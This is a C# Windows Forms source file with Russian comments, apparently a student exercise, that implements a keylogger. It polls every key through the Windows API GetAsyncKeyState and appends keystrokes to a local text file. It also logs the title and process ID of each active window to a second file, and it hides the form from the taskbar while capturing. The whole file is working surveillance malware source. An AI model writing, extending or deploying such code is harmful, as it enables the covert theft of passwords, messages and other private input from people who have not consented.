using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace WindowsFormsApp_07._03._25
{
    public partial class Form1: Form
    {
        // Импорт библиотек Windows API:
        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(Int32 vKey);            // получает состояние клавиши без ожидания нажатия 
        [DllImport("user32.dll")]
        public static extern IntPtr GetForegroundWindow();                // возвращает указатель на окно, находящееся в фокусе
        [DllImport("user32.dll")]
        public static extern UInt32 GetWindowThreadProcessId(IntPtr hwnd, ref Int32 pid); //извлекает ID процесса текущего окна

        public String buf = "";
        public String buf2 = "";
        public String puth1 = "./text_file1.txt";
        public String puth2 = "./text_file2.txt";

        public Form1()
        {
            InitializeComponent();

            // Определяется текущая локаль системы
            // Сохраняются код языка и его название
                       
            CultureInfo culture = CultureInfo.CurrentCulture;

            string languageCode = culture.TwoLetterISOLanguageName;

            string languageName = culture.DisplayName;

            richTextBox2.Text += "Код языка: " + languageCode + "\n";
            richTextBox2.Text += "Название кода: " + languageName + "\n";
        }

        // Мониторинг клавиатуры
        private void timer1_Tick_1(object sender, EventArgs e)
        {
            // Проверяет состояние всех клавиш(7 - 255)
            // Записывает нажатые клавиши в текстовое поле
            // Накапливает текст в буфере
            // Автоматически сохраняет буфер при достижении размера в 20 символов

            for (int key = 7; key < 256; key++)
            {
                int state = GetAsyncKeyState(key);

                if (state != 0)
                {
                    //richTextBox1.Text += ((Keys)key);
                    richTextBox1.Text += ((KeysRu)key).ToString().ToUpper();
                    buf += ((KeysRu)key).ToString().ToUpper();
                }
            }

            // Запись буфера при достижении размера
            if (buf.Length > 20)
            {
                WriteToTxt(buf);
                buf = "";
            }

        }

        // Отслеживание окон
        private void timer2_Tick_1(object sender, EventArgs e)
        {
            // Постоянно отслеживает активное окно
            // Извлекает информацию о процессе
            // Отображает ID и заголовок окна

            IntPtr h = GetForegroundWindow();     // Получаем активное окно
            int pid = 0;
            GetWindowThreadProcessId(h, ref pid);   // Получаем ID процесса
            Process p = Process.GetProcessById(pid);     // Находим процесс
            richTextBox2.Text += "id {" + p.Id + "}" + " TITLE: {" + p.MainWindowTitle + "}\n";
            WriteToTxt2("id {" + p.Id + "}" + " TITLE: {" + p.MainWindowTitle + "}\n");

        }

        // Сохранение данных
        private void WriteToTxt(string value) 
        {
            // Записывает накопленный текст в файл logger.txt
            // Использует режим добавления(append mode)
            // Закрывает поток после записи

            StreamWriter stream = new StreamWriter(puth1, true);
            stream.Write(value);
            stream.Close();     
            
        }

        private void WriteToTxt2(string value)
        {
            StreamWriter stream = new StreamWriter(puth2, true);
            stream.Write(value);
            stream.Close();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            this.FormBorderStyle = FormBorderStyle.None;
            //this.Width = 0;
            //this.Height = 0;
            this.ShowInTaskbar = false;

            if (textBox1.Text != "")
                puth1 = textBox1.Text;

            if (textBox1.Text != "")
                puth2 = textBox2.Text;

            if (checkBox1.Checked)
                timer1.Start();

            if (checkBox2.Checked)
                timer2.Start();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            if (textBox1.Text != "")
                puth1 = textBox1.Text;

            if (textBox1.Text != "")
                puth2 = textBox2.Text;

            if (checkBox1.Checked)
                timer1.Start();

            if (checkBox2.Checked)
                timer2.Start();
        }

        private void button3_Click(object sender, EventArgs e)
        {
            this.FormBorderStyle = FormBorderStyle.Sizable;

            if (checkBox1.Checked)
                timer1.Stop();

            if (checkBox2.Checked)
                timer2.Stop();
        }
    }
}
